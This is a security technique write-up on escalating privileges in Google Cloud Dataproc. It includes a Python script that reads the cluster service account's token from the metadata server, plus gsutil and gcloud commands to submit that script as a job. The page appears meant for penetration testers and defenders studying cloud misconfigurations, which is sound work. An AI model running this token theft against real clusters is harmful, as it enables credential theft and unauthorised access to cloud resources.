# GCP Dataproc Privilege Escalation

## Dataproc Roles and Privilege Escalation

Google Cloud Dataproc roles like roles/dataproc.editor and roles/dataproc.admin grant significant permissions over Dataproc resources. If these roles are assigned to a compromised user or service account, they can be abused to escalate privileges by leaking sensitive metadata tokens or accessing other GCP resources.

## Key Permissions in Dataproc Roles

roles/dataproc.editor - Modify Dataproc jobs. Submit PySpark, Spark, Hadoop, and other job types to a cluster. Access job logs and configurations. Interact with associated GCP services like Cloud Storage and BigQuery.

roles/dataproc.admin - Full control over Dataproc clusters, including creating, deleting, and managing clusters.

These permissions make both roles highly sensitive and dangerous if misused.

## dataproc.jobs.create & dataproc.clusters.use

The following method - projects.regions.jobs.submit enables a SA to create a dataproc job, which can be abused as shown in the example below. it must be noted that in order to exploit these permissions SA should also have the necessary privileges to move the malicious script to the storage bucket (storage.objects.create).

the following permissions were assigned to the SA for the PoC (dataproc.clusters.get, dataproc.clusters.use, dataproc.jobs.create, dataproc.jobs.get, dataproc.jobs.list, storage.objects.create, storage.objects.get, storage.objects.list)   


## Privilege Escalation via Metadata Token Leaking



- Submit a job to a Dataproc cluster.

- Use the job to access the metadata server.

- Leak the service account token used by the cluster.

### Example Script for token leaking

The following script demonstrates how an attacker can submit a job to a Dataproc cluster to leak the metadata token:

import requests

## Metadata server URL to fetch the access token

```
metadata_url = "http://metadata/computeMetadata/v1/instance/service-accounts/default/token"
headers = {"Metadata-Flavor": "Google"}

def fetch_metadata_token():
    try:
        response = requests.get(metadata_url, headers=headers, timeout=5)
        response.raise_for_status()
        token = response.json().get("access_token", "")
        print(f"Leaked Token: {token}")
        return token
    except Exception as e:
        print(f"Error fetching metadata token: {e}")
        return None

if __name__ == "__main__":
    fetch_metadata_token()
```

### Steps to exploit

```
# Copy the script to the storage bucket
gsutil cp fetch-metadata-token.py gs://dataproc-poc-bucket-hacktest/fetch-metadata-token.py
# Submit the malicious job
gcloud dataproc jobs submit pyspark gs://<bucket-name>/fetch_metadata_token.py \
    --cluster=<cluster-name> \
    --region=<region>
```
### Use the Leaked Token

The leaked token can be used to:

- Access GCP APIs and resources (depending on the tokenâ€™s permissions).
- Enumerate resources such as Cloud Storage buckets, BigQuery datasets, and more.
- Potentially escalate privileges further if the token has high-level permissions (e.g., roles/owner)
